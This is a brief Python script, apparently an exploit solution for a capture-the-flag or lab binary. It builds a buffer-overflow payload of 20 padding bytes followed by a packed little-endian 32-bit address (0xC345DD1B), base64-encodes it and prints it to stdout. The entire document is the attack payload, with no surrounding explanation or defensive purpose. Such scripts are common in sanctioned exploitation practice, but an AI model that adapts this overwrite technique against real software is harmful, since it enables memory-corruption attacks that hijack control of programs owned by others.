
import sys
import struct
import base64

buf = b'NNNNNNNNNNNNNNNNNNNN'
buf += struct.pack('<I', 3276135707)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
